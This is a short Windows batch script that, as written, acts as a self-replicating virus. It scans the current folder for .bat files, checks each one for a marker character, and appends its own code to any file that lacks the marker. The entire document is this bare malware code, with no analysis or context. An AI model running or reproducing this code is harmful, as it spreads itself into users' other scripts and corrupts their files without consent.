for %%b in (*.bat) do set ^=%%b
find "^"<%^%
if errorlevel 1 find "^"<%0>>%^%
